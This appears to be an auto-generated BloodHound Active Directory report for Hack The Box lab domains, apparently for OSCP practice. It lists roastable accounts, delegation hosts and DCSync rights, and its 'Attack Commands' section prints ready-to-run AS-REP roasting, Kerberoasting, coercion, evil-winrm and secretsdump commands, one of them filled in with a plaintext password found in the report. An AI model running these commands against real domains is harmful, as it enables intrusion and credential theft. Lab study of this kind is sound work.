# BloodHound Enhanced Report

**Generated:** 2025-12-31 02:54:53

---

## Data Inventory

**Domains:** EGOTISTICAL-BANK, EGOTISTICAL-BANK.LOCAL, HTB.LOCAL, HTB.LOCAL

| Type | Count | Details |
|------|-------|---------|
| Users | 75 | 40 enabled |
| Computers | 5 | EXCH01.HTB.LOCAL, EXCH01.HTB.LOCAL, FOREST.HTB.LOCAL |
| Groups | 206 | ACCOUNT OPERATORS@EGOTISTICAL-BANK.LOCAL, ACCOUNT OPERATORS@HTB.LOCAL, ACCOUNT OPERATORS@HTB.LOCAL |

**Relationships:** GenericAll: 771 | WriteDacl: 588 | MemberOf: 133 | DCSync: 13 | AdminTo: 3 | CanPSRemote: 2

## Attack Commands

## Attack Commands

### Quick Wins

### impacket-GetNPUsers - AS-REP Roasting Attack 

**Objective:** Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting).
Targets misconfigured accounts to obtain crackable password hashes without authentication.
**Rewards:** AS-REP roast - no auth required
**Template:** `impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE> <DOMAIN>/<USERNAME>`
**Example:** `impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete`
**Requires:** None (pre-auth disabled on target)

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| SVC-ALFRESCO@HTB.LOCAL | HTB.LOCAL |  | AS-REP roast - no auth required | `impacket-GetNPUsers -dc-ip 10.10.10.175 -request -outputfile <OUTPUT_FILE> htb.local/SVC-ALFRESCO` |
| FSMITH@EGOTISTICAL-BANK.LOCAL | EGOTISTICAL-BANK.LOCAL |  | AS-REP roast - no auth required | `impacket-GetNPUsers -dc-ip 10.10.10.175 -request -outputfile <OUTPUT_FILE> egotistical-bank.local/FSMITH` |

### impacket-GetUserSPNs - Kerberoasting Attack 

**Objective:** Request and extract TGS-REP hashes for service accounts (Kerberoasting)
**Rewards:** Kerberoast - request TGS for offline cracking
**Template:** `impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:"<PASSWORD>"`
**Example:** `impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/meg:"VimForPowerShell123!"`
**Need:** <PASSWORD>
**Requires:** Any authenticated domain user

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| HSMITH@EGOTISTICAL-BANK.LOCAL | EGOTISTICAL-BANK.LOCAL |  | Kerberoast - request TGS for offline cracking | `impacket-GetUserSPNs -request -dc-ip 10.10.10.175 egotistical-bank.local/FSMITH:"Thestrokes23"` |

### Rubeus - Monitor for TGTs (Unconstrained Delegation) 

**Objective:** Monitor for incoming TGTs on unconstrained delegation host
**Rewards:** Unconstrained delegation - monitor for TGT capture
**Template:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>`
**Example:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$`
**Need:** <TARGET_USER>
**Requires:** Local admin on unconstrained delegation host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
|  | FOREST.HTB.LOCAL |  | Unconstrained delegation - monitor for TGT capture | `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>` |
|  | SAUNA.EGOTISTICAL-BANK.LOCAL |  | Unconstrained delegation - monitor for TGT capture | `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>` |

### CrackMapExec - SMB Password Spraying 

**Objective:** SMB-based password spraying with CrackMapExec (noisy but shows admin rights with Pwn3d! indicator)
**Rewards:** Password in description - validate and use
**Template:** `crackmapexec smb <TARGET> -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success`
**Example:** `crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success`
**Need:** <PASSWORD>
**Requires:** LDAP read access (any domain user)

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| HSMITH |  |  | Temp password is Thestrokes23 | `crackmapexec smb 10.10.10.175 -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success` |

### Evil-WinRM - PowerShell Remoting 

**Objective:** Connect to Windows via WinRM for PowerShell access
**Rewards:** Password in description - validate and use
**Template:** `evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>`
**Example:** `evil-winrm -i 192.168.1.10 -u administrator -p Password123`
**Need:** <PASSWORD>
**Requires:** LDAP read access (any domain user)

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| HSMITH |  |  | Temp password is Thestrokes23 | `evil-winrm -i 10.10.10.175 -u HSMITH -p <PASSWORD>` |

### Lateral Movement

### Impacket PSExec - Remote Command Execution [AdminTo]

**Objective:** Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-psexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL | SAUNA.EGOTISTICAL-BANK.LOCAL |  | ADMINISTRATOR has local admin rights on SAUNA | `impacket-psexec 'egotistical-bank.local/ADMINISTRATOR:<PASSWORD>@10.10.10.175'` |

### Evil-WinRM - PowerShell Remoting [CanPSRemote]

**Objective:** Connect to Windows via WinRM for PowerShell access
**Rewards:** PowerShell remoting for stealthy command execution
**Template:** `evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>`
**Example:** `evil-winrm -i 192.168.1.10 -u administrator -p Password123`
**Need:** <PASSWORD>
**Requires:** Remote Management Users or Administrators group

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| FSMITH@EGOTISTICAL-BANK.LOCAL | SAUNA.EGOTISTICAL-BANK.LOCAL |  | FSMITH has PSRemote/WinRM access to SAUNA | `evil-winrm -i 10.10.10.175 -u FSMITH -p Thestrokes23` |
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | SAUNA.EGOTISTICAL-BANK.LOCAL |  | SVC_LOANMGR has PSRemote/WinRM access to SAUNA | `evil-winrm -i 10.10.10.175 -u SVC_LOANMGR -p <PASSWORD>` |

### PetitPotam - Coerce NTLM Authentication [CoerceToTGT]

**Objective:** Force target machine to authenticate to attacker using EfsRpcOpenFileRaw
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 PetitPotam.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| FOREST.HTB.LOCAL | HTB.LOCAL |  | FOREST.HTB.LOCAL can coerce HTB auth to capture TGT | `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d 'htb.local' None HTB.LOCAL` |

### Coercer - Multi-Protocol Authentication Coercion [CoerceToTGT]

**Objective:** Test multiple coercion methods (MS-RPRN, MS-EFSR, MS-FSRVP, etc.)
**Rewards:** Coerce authentication to capture TGT
**Template:** `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -l <LISTENER_IP> -t <TARGET_IP>`
**Example:** `coercer coerce -u 'user' -p '<PASSWORD>' -d 'corp.local' -l 192.168.50.100 -t 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| FOREST.HTB.LOCAL | HTB.LOCAL |  | FOREST.HTB.LOCAL can coerce HTB auth to capture TGT | `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d 'htb.local' -l None -t HTB.LOCAL` |

### PrinterBug/SpoolSample - Trigger Print Spooler Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-RPRN (Print Spooler)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>' <LISTENER_IP>`
**Example:** `python3 printerbug.py 'corp.local/user:<PASSWORD>@192.168.50.70' 192.168.50.100`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| FOREST.HTB.LOCAL | HTB.LOCAL |  | FOREST.HTB.LOCAL can coerce HTB auth to capture TGT | `python3 printerbug.py 'htb.local/<USERNAME>:<PASSWORD>@HTB.LOCAL' None` |

### DFSCoerce - Trigger DFS Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-DFSNM (DFS)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 dfscoerce.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| FOREST.HTB.LOCAL | HTB.LOCAL |  | FOREST.HTB.LOCAL can coerce HTB auth to capture TGT | `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d 'htb.local' None HTB.LOCAL` |

### Privilege Escalation

### DCSync Single User with impacket-secretsdump [DCSync]

**Objective:** Linux-based DCSync attack using impacket-secretsdump to extract a specific user's credentials via DRSUAPI replication. Ideal for OSCP Kali-based attacks.
**Rewards:** DCSync - dump domain hashes
**Template:** `impacket-secretsdump -just-dc-user <TARGET_USER> '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'`
**Example:** `impacket-secretsdump -just-dc-user <Administrator> '<corp.com>/<administrator>:<Password123!>@<192.168.50.70>'`
**Need:** <TARGET_USER>, <PASSWORD>
**Requires:** GetChanges + GetChangesAll on domain object

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | DC01.EGOTISTICAL-BANK.LOCAL | [PARTIAL RIGHTS] | SVC_LOANMGR has DCSync rights (GetChanges+GetChangesAll) | `impacket-secretsdump -just-dc-user <TARGET_USER> 'egotistical-bank.local/SVC_LOANMGR:<PASSWORD>@10.10.10.175'` |

### DCSync Single User with impacket-secretsdump [DCSync]

**Objective:** Linux-based DCSync attack using impacket-secretsdump to extract a specific user's credentials via DRSUAPI replication. Ideal for OSCP Kali-based attacks.
**Rewards:** Full DCSync rights (GetChanges+GetChangesAll)
**Template:** `impacket-secretsdump -just-dc-user <TARGET_USER> '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'`
**Example:** `impacket-secretsdump -just-dc-user <Administrator> '<corp.com>/<administrator>:<Password123!>@<192.168.50.70>'`
**Need:** <TARGET_USER>, <PASSWORD>
**Requires:** GetChanges + GetChangesAll on domain object

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | EGOTISTICAL-BANK.LOCAL |  | SVC_LOANMGR has DCSync rights (GetChanges+GetChangesAll) | `impacket-secretsdump -just-dc-user <TARGET_USER> 'egotistical-bank.local/SVC_LOANMGR:<PASSWORD>@10.10.10.175'` |

---

## Quick Wins

### [OK] AS-REP Roastable Users
**OSCP Relevance:** HIGH | **Results:** 3

> Find users with Kerberos pre-authentication disabled (dontreqpreauth=true). These can be AS-REP roasted without authentication using GetNPUsers.py.

| User | IsPrivileged | Description |
| --- | --- | --- |
| SVC-ALFRESCO@HTB.LOCAL | True |  |
| SVC-ALFRESCO@HTB.LOCAL | True |  |
| FSMITH@EGOTISTICAL-BANK.LOCAL | False |  |

### [OK] Kerberoastable Service Accounts
**OSCP Relevance:** HIGH | **Results:** 1

> Find users with Service Principal Names (SPNs). These can be Kerberoasted to obtain TGS hashes for offline cracking.

| ServiceAccount | SPNs | IsPrivileged | Description |
| --- | --- | --- | --- |
| HSMITH@EGOTISTICAL-BANK.LOCAL | ['SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111'] | False |  |

### [-] High-Value Kerberoastable (Privileged + SPN)
**OSCP Relevance:** HIGH | **Results:** None

### [OK] Unconstrained Delegation Systems
**OSCP Relevance:** HIGH | **Results:** 2

> Find computers with unconstrained delegation enabled. These can be abused to capture TGTs from authenticating users (printer bug, coercion attacks).

| Computer | ComputerIP | OS | Description |
| --- | --- | --- | --- |
| FOREST.HTB.LOCAL |  | WINDOWS SERVER 2016 STANDARD |  |
| SAUNA.EGOTISTICAL-BANK.LOCAL | 10.10.10.175 | Windows Server 2019 Datacenter |  |

### [-] Constrained Delegation Principals
**OSCP Relevance:** HIGH | **Results:** None

### [OK] Users with Passwords in Description
**OSCP Relevance:** HIGH | **Results:** 1

> Find users with password hints or actual passwords in their AD description field. Common admin mistake.

| User | Description | IsPrivileged |
| --- | --- | --- |
| HSMITH | Temp password is Thestrokes23 |  |

### [OK] Accounts with Password Never Expires
**OSCP Relevance:** MEDIUM | **Results:** 38

> Find accounts with non-expiring passwords. Often service accounts with weak passwords or credentials in documentation.

| User | IsPrivileged | Description |
| --- | --- | --- |
| SVC-ALFRESCO@HTB.LOCAL | True |  |
| SVC-ALFRESCO@HTB.LOCAL | True |  |
| ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL | True | Built-in account for administering the computer/domain |
| SANTI@HTB.LOCAL | False |  |
| MARK@HTB.LOCAL | False |  |
| ANDY@HTB.LOCAL | False |  |
| LUCINDA@HTB.LOCAL | False |  |
| SEBASTIEN@HTB.LOCAL | False |  |
| HEALTHMAILBOX7108A4E@HTB.LOCAL | False |  |
| HEALTHMAILBOX0659CC1@HTB.LOCAL | False |  |
| HEALTHMAILBOXB01AC64@HTB.LOCAL | False |  |
| HEALTHMAILBOX6DED678@HTB.LOCAL | False |  |
| HEALTHMAILBOX83D6781@HTB.LOCAL | False |  |
| HEALTHMAILBOXFD87238@HTB.LOCAL | False |  |
| HEALTHMAILBOX968E74D@HTB.LOCAL | False |  |
| HEALTHMAILBOX670628E@HTB.LOCAL | False |  |
| HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |  |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |  |
| HEALTHMAILBOXC3D7722@HTB.LOCAL | False |  |
| MARK@HTB.LOCAL | False |  |
| ANDY@HTB.LOCAL | False |  |
| LUCINDA@HTB.LOCAL | False |  |
| SANTI@HTB.LOCAL | False |  |
| SEBASTIEN@HTB.LOCAL | False |  |
| HEALTHMAILBOX0659CC1@HTB.LOCAL | False |  |
| HEALTHMAILBOXB01AC64@HTB.LOCAL | False |  |
| HEALTHMAILBOX7108A4E@HTB.LOCAL | False |  |
| HEALTHMAILBOXFD87238@HTB.LOCAL | False |  |
| HEALTHMAILBOX83D6781@HTB.LOCAL | False |  |
| HEALTHMAILBOX6DED678@HTB.LOCAL | False |  |
| HEALTHMAILBOX968E74D@HTB.LOCAL | False |  |
| HEALTHMAILBOX670628E@HTB.LOCAL | False |  |
| HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |  |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |  |
| HEALTHMAILBOXC3D7722@HTB.LOCAL | False |  |
| FSMITH@EGOTISTICAL-BANK.LOCAL | False |  |
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | False |  |
| HSMITH@EGOTISTICAL-BANK.LOCAL | False |  |

### [OK] Accounts That Never Logged In
**OSCP Relevance:** MEDIUM | **Results:** 28

> Find accounts that have never logged in. May have default or documented passwords.

| User | Description | Created |
| --- | --- | --- |
| SANTI@HTB.LOCAL |  |  |
| MARK@HTB.LOCAL |  |  |
| ANDY@HTB.LOCAL |  |  |
| LUCINDA@HTB.LOCAL |  |  |
| HEALTHMAILBOX7108A4E@HTB.LOCAL |  |  |
| HEALTHMAILBOX0659CC1@HTB.LOCAL |  |  |
| HEALTHMAILBOXB01AC64@HTB.LOCAL |  |  |
| HEALTHMAILBOX6DED678@HTB.LOCAL |  |  |
| HEALTHMAILBOX83D6781@HTB.LOCAL |  |  |
| HEALTHMAILBOXFD87238@HTB.LOCAL |  |  |
| HEALTHMAILBOX968E74D@HTB.LOCAL |  |  |
| HEALTHMAILBOX670628E@HTB.LOCAL |  |  |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL |  |  |
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL |  |  |
| HSMITH@EGOTISTICAL-BANK.LOCAL |  |  |
| SANTI@HTB.LOCAL |  | 1569020575.0 |
| MARK@HTB.LOCAL |  | 1569020250.0 |
| ANDY@HTB.LOCAL |  | 1569019196.0 |
| LUCINDA@HTB.LOCAL |  | 1568940253.0 |
| HEALTHMAILBOX0659CC1@HTB.LOCAL |  | 1568894278.0 |
| HEALTHMAILBOX7108A4E@HTB.LOCAL |  | 1568894268.0 |
| HEALTHMAILBOXB01AC64@HTB.LOCAL |  | 1568894257.0 |
| HEALTHMAILBOXFD87238@HTB.LOCAL |  | 1568894247.0 |
| HEALTHMAILBOX83D6781@HTB.LOCAL |  | 1568894237.0 |
| HEALTHMAILBOX6DED678@HTB.LOCAL |  | 1568894226.0 |
| HEALTHMAILBOX968E74D@HTB.LOCAL |  | 1568894216.0 |
| HEALTHMAILBOX670628E@HTB.LOCAL |  | 1568894205.0 |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL |  | 1568894195.0 |

### [OK] Computers Without LAPS
**OSCP Relevance:** MEDIUM | **Results:** 4

> Find computers that don't have LAPS deployed. Local admin passwords may be reused or weak.

| Computer | ComputerIP | OS |
| --- | --- | --- |
| EXCH01.HTB.LOCAL |  | Windows Server 2016 Standard |
| EXCH01.HTB.LOCAL |  | WINDOWS SERVER 2016 STANDARD |
| FOREST.HTB.LOCAL |  | WINDOWS SERVER 2016 STANDARD |
| SAUNA.EGOTISTICAL-BANK.LOCAL | 10.10.10.175 | Windows Server 2019 Datacenter |

### [OK] Pre-Windows 2000 Compatible Access Accounts
**OSCP Relevance:** LOW | **Results:** 4

> Find computers in Pre-Windows 2000 Compatible Access group. Legacy compatibility may expose vulnerabilities.

| Member | Type | ViaGroup |
| --- | --- | --- |
| EVERYONE@HTB.LOCAL | ['Group'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@HTB.LOCAL |
| EVERYONE@HTB.LOCAL | ['Group', 'Base'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@HTB.LOCAL |
|  | ['Group', 'Base'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@HTB.LOCAL |
| AUTHENTICATED USERS@EGOTISTICAL-BANK.LOCAL | ['Group'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@EGOTISTICAL-BANK.LOCAL |

### [-] ReadGMSAPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### [-] ReadLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### [-] All gMSA Accounts
**OSCP Relevance:** HIGH | **Results:** None

---

## Lateral Movement

### [-] Non-DA Users with Local Admin on Workstations
**OSCP Relevance:** HIGH | **Results:** None

### [OK] All Local Admins per Computer
**OSCP Relevance:** HIGH | **Results:** 1

> Enumerate all principals (users, groups) with local admin rights on each computer. Useful for identifying high-value targets with many admin paths.

| Computer | ComputerIP | LocalAdmins | AdminCount |
| --- | --- | --- | --- |
| SAUNA.EGOTISTICAL-BANK.LOCAL | 10.10.10.175 | ['ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL', 'ENTERPRISE ADMINS@EGOTISTICAL-BANK.LOCAL', 'DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL'] | 3 |

### [OK] PSRemote Access (Evil-WinRM Targets)
**OSCP Relevance:** HIGH | **Results:** 2

> Find users with PowerShell Remoting access to computers. These are Evil-WinRM targets for lateral movement.

| User | PSRemoteTargets | PSRemoteIPs | TargetCount |
| --- | --- | --- | --- |
| FSMITH@EGOTISTICAL-BANK.LOCAL | ['SAUNA.EGOTISTICAL-BANK.LOCAL'] | ['10.10.10.175'] | 1 |
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | ['SAUNA.EGOTISTICAL-BANK.LOCAL'] | ['10.10.10.175'] | 1 |

### [-] RDP Access Targets
**OSCP Relevance:** HIGH | **Results:** None

### [-] DCOM Execution Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### Sessions on Specific Computer
*Skipped - requires variables: COMPUTER*

### All Computer Access for Specific User
*Skipped - requires variables: USER*

### All Users Who Can Access Specific Computer
*Skipped - requires variables: COMPUTER*

### [-] Computers Where Domain Users Are Local Admin
**OSCP Relevance:** HIGH | **Results:** None

### [OK] Computers with Multiple Admin Paths
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find computers accessible via multiple different users. These are high-value targets with more exploitation options.

| Computer | ComputerIP | NumberOfAdminPaths | Admins |
| --- | --- | --- | --- |
| SAUNA.EGOTISTICAL-BANK.LOCAL | 10.10.10.175 | 3 | ['ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL', 'ENTERPRISE ADMINS@EGOTISTICAL-BANK.LOCAL', 'DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL'] |

### [-] Workstations with Domain Admin Sessions
**OSCP Relevance:** HIGH | **Results:** None

### [-] Cross-Trust Lateral Movement
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] Coercion Targets (Unconstrained Delegation)
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation that can capture TGTs via coercion attacks (PetitPotam, PrinterBug, DFSCoerce). Coerce a DC to authenticate to these systems to capture its TGT.

| CoercionHost | CoercionHostIP | OS | CanCaptureTGTFrom | TargetType |
| --- | --- | --- | --- | --- |
| FOREST.HTB.LOCAL |  | WINDOWS SERVER 2016 STANDARD | HTB.LOCAL | ['Base', 'Domain', 'Tag_Tier_Zero'] |

### [-] SID History Abuse Paths
**OSCP Relevance:** HIGH | **Results:** None

### [-] Domain Trust Relationships
**OSCP Relevance:** HIGH | **Results:** None

---

## Privilege Escalation

### [OK] DCSync Rights
**OSCP Relevance:** HIGH | **Results:** 17

> Find principals with DCSync rights (GetChanges + GetChangesAll on Domain). Can perform secretsdump.py to extract all domain hashes.

| Principal | Type | Right |
| --- | --- | --- |
| DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] | GetChangesAll |
| ADMINISTRATORS@HTB.LOCAL | ['Group'] | GetChangesAll |
| ADMINISTRATORS@HTB.LOCAL | ['Group'] | GetChanges |
| ENTERPRISE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] | GetChanges |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] | GetChanges |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base'] | GetChanges |
| ENTERPRISE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |
| ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |
| ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | ['User'] | GetChangesAll |
| DOMAIN CONTROLLERS@EGOTISTICAL-BANK.LOCAL | ['Group'] | GetChangesAll |
| ADMINISTRATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] | GetChangesAll |
| ADMINISTRATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] | GetChanges |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@EGOTISTICAL-BANK.LOCAL | ['Group'] | GetChanges |
| ENTERPRISE DOMAIN CONTROLLERS@EGOTISTICAL-BANK.LOCAL | ['Group'] | GetChanges |
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | ['User'] | GetChanges |

### [OK] GenericAll on High-Value Targets
**OSCP Relevance:** HIGH | **Results:** 50

> Find principals with GenericAll (full control) over privileged users, groups, or computers. Can reset passwords, modify group memberships, etc.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SYSADMINS@HTB.LOCAL | ['Base', 'OU'] |
| DOMAIN ADMINS@HTB.LOCAL | SYSADMINS@HTB.LOCAL | ['Base', 'OU'] |
| ENTERPRISE ADMINS@HTB.LOCAL | EXCHANGE ADMINISTRATORS@HTB.LOCAL | ['Base', 'OU'] |
| DOMAIN ADMINS@HTB.LOCAL | EXCHANGE ADMINISTRATORS@HTB.LOCAL | ['Base', 'OU'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Base', 'OU', 'Tag_Tier_Zero'] |
